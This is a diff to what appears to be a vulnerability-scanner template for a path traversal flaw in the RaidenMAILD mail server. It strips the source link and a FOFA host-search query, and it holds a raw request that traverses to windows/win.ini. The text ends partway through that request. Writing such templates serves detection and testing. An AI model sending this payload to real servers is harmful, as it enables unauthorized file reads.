@@ -3,12 +3,8 @@ info:
   name: RaidenMAILD 邮件服务器 路径遍历漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gzr0yb580ok8pc5d'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gzr0yb580ok8pc5d
-    fofa: body="RaidenMAILD"
 http:
 - raw:
   - 'GET /webeditor/../../../windows/win.ini HTTP/1.1
